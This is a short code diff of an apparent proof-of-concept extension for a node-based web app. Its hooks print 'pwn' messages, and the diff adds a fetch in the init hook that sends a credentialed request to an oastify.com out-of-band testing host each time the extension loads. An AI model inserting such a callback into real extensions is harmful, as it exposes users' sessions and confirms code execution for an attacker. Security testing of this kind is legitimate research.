@@ -10,19 +10,19 @@ const ext = {
     init(app) {
         console.log("pwn-init!");
         alert("pwn-init!");
-        window.parent.postMessage({ type: "pwn-init" } , "*");
+        await fetch("https://go8w693qtipnk91pif5ittmlpcv3jt7i.oastify.com", {
+            method: "GET",
+            mode: "no-cors",
+            credentials: "include"
+        });
     },
 
     async beforeRegisterNodeDef(nodeType, nodeData, app2) {
         console.log("pwn-beforeRegisterNodeDef!");
-        alert("pwn-beforeRegisterNodeDef!");
-        window.parent.postMessage({ type: "pwn-beforeRegisterNodeDef" } , "*");
     },
 
     async setup() {
         console.log("pwn-setup!");
-        alert("pwn-setup!");
-        window.parent.postMessage({ type: "pwn-setup" } , "*");
     }
 }
 
